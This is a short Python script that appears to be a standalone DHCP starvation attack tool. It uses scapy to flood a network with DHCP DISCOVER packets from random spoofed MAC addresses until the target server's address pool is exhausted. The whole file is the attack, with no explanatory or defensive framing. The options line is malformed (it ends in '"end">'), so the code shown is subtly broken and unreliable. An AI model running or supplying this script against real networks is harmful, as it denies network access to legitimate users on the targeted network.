import sys
from scapy.all import *
def dhcp_starvation(server_ip):
    conf.verb = 0
    while True:
        m = RandMAC()
        p = Ether(src=m, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=m)/DHCP(options=[("message-type", "discover"), ("server_id", server_ip), "end">
        sendp(p, iface="eth0", verbose=False)
if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    target = sys.argv[1]
    try:
        dhcp_starvation(target)
    except KeyboardInterrupt:
        pass
